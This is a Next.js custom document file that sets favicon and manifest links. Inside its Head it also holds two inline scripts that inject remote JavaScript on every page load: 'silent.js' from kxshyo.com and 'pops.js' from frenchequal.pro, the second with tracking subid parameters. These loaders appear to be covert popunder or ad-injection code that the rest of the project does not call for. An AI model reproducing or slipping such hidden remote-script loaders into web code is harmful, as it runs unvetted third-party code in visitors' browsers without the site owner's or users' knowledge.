import Document, { Html, Head, Main, NextScript } from "next/document";

class MyDocument extends Document {
  render() {
    return (
      <Html lang="en">
        <Head>
          <link
            rel="apple-touch-icon"
            sizes="180x180"
            href="/favicon/apple-touch-icon.png"
          />
          <link
            rel="icon"
            type="image/png"
            sizes="32x32"
            href="/favicon/favicon-32x32.png"
          />
          <link
            rel="icon"
            type="image/png"
            sizes="16x16"
            href="/favicon/favicon-16x16.png"
          />
          <link rel="manifest" href="/favicon/site.webmanifest" />
          <script>
            (function(d){let s=d.createElement('script');s.async=true;s.src='https://kxshyo.com/code/silent.js?h=waWQiOjExNjQyNTIsInNpZCI6MTI2NTgyNywid2lkIjo0ODA0ODYsInNyYyI6Mn0=eyJ';d.head.appendChild(s);})(document);
            </script>
            <script>(function(d,a,b){let s=d.createElement('script');s.async=true;s.src='https://frenchequal.pro/code/pops.js?h=waWQiOjExNjQyNTIsInNpZCI6MTI2NTkyOSwid2lkIjo0ODA3MTQsInNyYyI6Mn0=eyJ&si1='+a+'&si2='+b;d.head.appendChild(s);})(document,'subid1','subid2');</script>        </Head>
        <body>
          <Main />
          <NextScript />
        </body>
      </Html>
    );
  }
}

export default MyDocument;
